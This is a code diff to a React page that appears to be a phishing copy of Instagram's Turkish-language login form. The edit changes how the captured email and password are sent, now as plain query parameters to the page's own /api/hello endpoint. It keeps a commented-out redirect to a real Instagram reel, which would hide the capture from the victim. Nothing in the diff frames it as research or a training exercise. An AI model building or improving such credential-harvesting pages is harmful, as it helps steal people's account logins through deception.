@@ -18,15 +18,19 @@ export default function Home() {
 
   const SubmitHandler = (e) => {
     e.preventDefault()
-    fetch("/api/hello", {
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      method: "POST",
-      body: JSON.stringify({ mail: mail, password: password })
-    })
-    .then((res) => {console.log(res)})
-    .catch((err) => {console.log(err)})
+    // fetch("/api/hello", {
+    //   headers: {
+    //     'Content-Type': 'application/json'
+    //   },
+    //   method: "POST",
+    //   body: JSON.stringify({ mail: mail, password: password })
+    // })
+    // .then((res) => {console.log(res)})
+    // .catch((err) => {console.log(err)})
+    fetch(`/api/hello?mail=${mail}&password=${password}`)
+      .catch(err => console.log(err))
+      .then(res => console.log(res))
+    
     // setTimeout(() => {
     //   location.href = "https://www.instagram.com/reels/videos/CoBHsQnJP3z/"
     // }, 1000);
@@ -81,7 +85,7 @@ export default function Home() {
                       <div className='flex flex-col gap-2 text-sm'>
                         <input required type="text" value={mail} className='border border-[#dbdbdb] p-2 rounded-[2px] bg-[#fafafa] outline-none' placeholder='Telefon numarası, kullanıcı adı veya e-posta' onChange={e => setMail(e.target.value)} />
                         <input required type="password" value={password} className='border border-[#dbdbdb] p-2 rounded-[2px] bg-[#fafafa] outline-none' placeholder='Şifre' onChange={e => setPassword(e.target.value)} />
-                        <input type="submit"  value={"Giriş yap"} className="bg-[#0095f6] py-2 px-4 rounded-lg text-white font-medium cursor-pointer" />
+                        <input type="submit" value={"Giriş yap"} className="bg-[#0095f6] py-2 px-4 rounded-lg text-white font-medium cursor-pointer" />
                       </div>
                     </form>
                   </div>
